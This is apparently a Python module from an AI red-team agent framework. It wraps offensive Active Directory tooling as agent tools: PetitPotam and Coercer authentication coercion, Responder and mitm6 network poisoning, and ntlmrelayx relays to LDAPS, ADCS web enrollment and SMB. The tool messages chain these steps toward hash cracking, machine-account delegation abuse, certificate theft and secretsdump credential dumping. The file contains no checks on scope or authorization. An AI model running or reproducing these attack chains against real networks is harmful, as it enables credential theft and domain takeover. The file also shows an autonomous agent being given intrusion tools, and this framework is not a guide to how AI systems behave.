"""Red Team authentication coercion tools.

This module provides toolsets for:
- PetitPotam, Coercer, and other coercion techniques
- Responder and mitm6 for capturing/relaying credentials
"""

import time

import dreadnode as dn
from dreadnode.agent.tools.base import Toolset
from loguru import logger

from ares.tools.red.common import (
    AnyRedTeamState,
    run_tool,
)


def _kill_existing_relay_processes() -> str:
    """Kill any existing ntlmrelayx/responder processes to free ports.

    Returns:
        Status message about what was killed.
    """
    killed = []

    # Kill ntlmrelayx processes
    try:
        _stdout, _, code = run_tool(["pkill", "-9", "-f", "ntlmrelayx"], timeout_seconds=5)
        if code == 0:
            killed.append("ntlmrelayx")
    except Exception:
        pass

    # Kill responder processes
    try:
        _stdout, _, code = run_tool(["pkill", "-9", "-f", "Responder.py"], timeout_seconds=5)
        if code == 0:
            killed.append("responder")
    except Exception:
        pass

    if killed:
        # Brief pause for ports to be released
        time.sleep(1)
        return f"Killed existing processes: {', '.join(killed)}"
    return ""


class CoercionTools(Toolset):
    """Tools for coercing NTLM authentication from Windows machines.

    These tools trigger outbound authentication that can be captured
    or relayed to gain access to other services.
    """

    state: AnyRedTeamState | None = None

    def set_state(self, state: AnyRedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    @dn.tool_method
    def petitpotam(
        self,
        target: str,
        listener: str,
        username: str = "",
        password: str = "",
        domain: str = "",
    ) -> str:
        """Coerce NTLM auth via MS-EFSRPC. Use with ntlmrelayx for relay attacks."""
        # Use coercer with MS-EFSR filter (same as PetitPotam) since petitpotam.py
        # may not be installed. Coercer is more reliable and widely available.
        cmd = [
            "coercer",
            "coerce",
            "-t",
            target,
            "-l",
            listener,
            "--filter-protocol-name",
            "MS-EFSR",  # This is the PetitPotam protocol
        ]

        if username and password:
            cmd.extend(["-u", username, "-p", password])
            if domain:
                cmd.extend(["-d", domain])

        try:
            logger.info(f"[*] Running PetitPotam (via coercer MS-EFSR) against {target}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=60)

            result = stdout + "\n" + (stderr or "")

            if "worked" in result.lower() or "success" in result.lower():
                logger.info("[+] PetitPotam coercion successful!")
                result = (
                    "🚨 PETITPOTAM COERCION SUCCESSFUL!\n"
                    f"\u2192 Target {target} should authenticate to {listener}\n"
                    "\u2192 Check ntlmrelayx/Responder for captured auth\n\n" + result
                )

            return result

        except Exception as e:
            return f"PetitPotam (MS-EFSR coercion) failed: {e}"

    @dn.tool_method
    def coercer(
        self,
        target: str,
        listener: str,
        username: str = "",
        password: str = "",
        domain: str = "",
    ) -> str:
        """Try multiple RPC coercion methods (MS-EFSR, MS-RPRN, MS-DFSNM, etc.)."""
        cmd = ["coercer", "coerce", "-t", target, "-l", listener]

        if username and password:
            cmd.extend(["-u", username, "-p", password])
            if domain:
                cmd.extend(["-d", domain])

        try:
            logger.info(f"[*] Running Coercer against {target}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=120)

            result = stdout + "\n" + (stderr or "")

            if "success" in result.lower() or "worked" in result.lower():
                logger.info("[+] Coercer found working methods!")
                result = (
                    "🚨 COERCION METHODS FOUND!\n"
                    f"\u2192 Target {target} can be coerced to {listener}\n"
                    "\u2192 Use with ntlmrelayx for exploitation\n\n" + result
                )

            return result

        except Exception as e:
            return f"Coercer failed: {e}"


class CoercionNetworkTools(Toolset):
    """Tools for network-based authentication capture and relay.

    These tools passively or actively capture credentials on the network.
    """

    state: AnyRedTeamState | None = None

    def set_state(self, state: AnyRedTeamState) -> None:
        """Set the operation state for this toolset."""
        self.state = state

    @dn.tool_method
    def start_responder(
        self,
        interface: str = "",
        analyze_mode: bool = False,
    ) -> str:
        """Poison LLMNR/NBT-NS/MDNS to capture NetNTLMv2 hashes."""
        from ares.core.config import get_default_network_interface

        # Kill any existing relay/responder processes to free ports
        cleanup_msg = _kill_existing_relay_processes()
        if cleanup_msg:
            logger.info(f"[*] Cleanup: {cleanup_msg}")

        if not interface:
            interface = get_default_network_interface()

        cmd = ["responder", "-I", interface]

        if analyze_mode:
            cmd.append("-A")

        try:
            logger.info(f"[*] Starting Responder on {interface}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=30)

            result = stdout + "\n" + (stderr or "")
            return (
                "📶 RESPONDER STARTED\n"
                f"\u2192 Listening on {interface}\n"
                "\u2192 Captured hashes will appear in logs\n"
                "\u2192 Use crack_with_hashcat on captured NTLMv2 hashes (mode 5600)\n\n" + result
            )

        except Exception as e:
            return f"Responder failed: {e}"

    @dn.tool_method
    def start_mitm6(
        self,
        domain: str,
        interface: str = "",
    ) -> str:
        """IPv6 DNS takeover via DHCPv6. Use with ntlmrelayx for relay."""
        from ares.core.config import get_default_network_interface

        if not interface:
            interface = get_default_network_interface()

        cmd = ["mitm6", "-d", domain, "-i", interface]

        try:
            logger.info(f"[*] Starting mitm6 for {domain}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=30)

            result = stdout + "\n" + (stderr or "")
            return (
                "📶 MITM6 STARTED\n"
                f"\u2192 Rogue DHCPv6/DNS for {domain}\n"
                "\u2192 Run ntlmrelayx in parallel to relay captured auth\n\n" + result
            )

        except Exception as e:
            return f"mitm6 failed: {e}"

    @dn.tool_method
    def ntlmrelayx_to_ldaps(
        self,
        dc_ip: str,
        delegate_access: bool = True,
    ) -> str:
        """Relay to LDAPS for RBCD attack. Creates machine account with --delegate-access."""
        # Kill any existing relay processes to free ports
        cleanup_msg = _kill_existing_relay_processes()
        if cleanup_msg:
            logger.info(f"[*] Cleanup: {cleanup_msg}")

        cmd = ["ntlmrelayx.py", "-t", f"ldaps://{dc_ip}", "--no-smb-server"]

        if delegate_access:
            cmd.append("--delegate-access")

        try:
            logger.info(f"[*] Starting ntlmrelayx targeting LDAPS on {dc_ip}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=30)

            result = stdout + "\n" + (stderr or "")
            return (
                "📋 NTLMRELAYX STARTED\n"
                f"\u2192 Relaying to ldaps://{dc_ip}\n"
                "\u2192 Use petitpotam/coercer to trigger authentication\n"
                "\u2192 Machine account will be created for RBCD\n\n" + result
            )

        except Exception as e:
            return f"ntlmrelayx failed: {e}"

    @dn.tool_method
    def ntlmrelayx_to_adcs(
        self,
        ca_host: str,
        template: str = "DomainController",
    ) -> str:
        """ESC8 relay to ADCS web enrollment. Coerce DC to get its certificate."""
        # Kill any existing relay processes to free ports
        cleanup_msg = _kill_existing_relay_processes()
        if cleanup_msg:
            logger.info(f"[*] Cleanup: {cleanup_msg}")

        cmd = [
            "ntlmrelayx.py",
            "-t",
            f"http://{ca_host}/certsrv/certfnsh.asp",
            "--adcs",
            "--template",
            template,
        ]

        try:
            logger.info(f"[*] Starting ntlmrelayx targeting ADCS on {ca_host}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=30)

            result = stdout + "\n" + (stderr or "")
            return (
                "📋 NTLMRELAYX TO ADCS STARTED\n"
                f"\u2192 Relaying to http://{ca_host}/certsrv/\n"
                f"\u2192 Template: {template}\n"
                "\u2192 Coerce a DC to get its certificate\n"
                "\u2192 Use certipy_auth with resulting .pfx\n\n" + result
            )

        except Exception as e:
            return f"ntlmrelayx to ADCS failed: {e}"

    @dn.tool_method
    def ntlmrelayx_to_smb(
        self,
        target_ip: str,
        socks: bool = True,
        interactive: bool = False,
    ) -> str:
        """Relay to SMB (requires signing disabled). SOCKS proxy for secretsdump."""
        # Kill any existing relay processes to free ports
        cleanup_msg = _kill_existing_relay_processes()
        if cleanup_msg:
            logger.info(f"[*] Cleanup: {cleanup_msg}")

        cmd = [
            "ntlmrelayx.py",
            "-t",
            f"smb://{target_ip}",
            "-smb2support",
        ]

        if socks:
            cmd.append("-socks")

        if interactive:
            cmd.extend(["-i", "-c", "whoami"])

        try:
            logger.info(f"[*] Starting ntlmrelayx targeting SMB on {target_ip}")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=30)

            result = stdout + "\n" + (stderr or "")

            socks_msg = ""
            if socks:
                socks_msg = (
                    "\n→ SOCKS proxy enabled!\n"
                    "→ After relay succeeds:\n"
                    "   proxychains secretsdump.py -no-pass DOMAIN/USER@TARGET\n"
                    "   proxychains smbclient.py -no-pass DOMAIN/USER@TARGET\n"
                )

            return (
                "📋 NTLMRELAYX TO SMB STARTED\n"
                f"→ Relaying to smb://{target_ip}\n"
                "→ REQUIRES: SMB signing disabled on target\n"
                "→ Use petitpotam/coercer to trigger authentication\n"
                f"{socks_msg}\n" + result
            )

        except Exception as e:
            return f"ntlmrelayx to SMB failed: {e}"

    @dn.tool_method
    def ntlmrelayx_multirelay(
        self,
        targets_file: str | None = None,
        target_ips: str | None = None,
        dump_sam: bool = True,
    ) -> str:
        """Relay to multiple SMB targets. Provide targets_file or comma-separated target_ips."""
        if not targets_file and not target_ips:
            return "Error: Provide either targets_file or target_ips"

        # Kill any existing relay processes to free ports
        cleanup_msg = _kill_existing_relay_processes()
        if cleanup_msg:
            logger.info(f"[*] Cleanup: {cleanup_msg}")

        cmd = [
            "ntlmrelayx.py",
            "-smb2support",
            "-socks",
        ]

        if targets_file:
            cmd.extend(["-tf", targets_file])
        elif target_ips:
            # Create temporary targets file
            import tempfile

            with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
                for ip in target_ips.split(","):
                    f.write(f"{ip.strip()}\n")
                targets_file = f.name
            cmd.extend(["-tf", targets_file])

        try:
            logger.info("[*] Starting ntlmrelayx multi-target SMB relay")
            stdout, stderr, _ = run_tool(cmd, timeout_seconds=30)

            result = stdout + "\n" + (stderr or "")
            return (
                "📋 NTLMRELAYX MULTI-TARGET STARTED\n"
                "→ Relaying to multiple SMB targets\n"
                "→ SOCKS proxy enabled for relayed sessions\n"
                "→ Use petitpotam/coercer to trigger authentication\n"
                "→ Sessions will appear in socks proxy\n\n" + result
            )

        except Exception as e:
            return f"ntlmrelayx multi-relay failed: {e}"
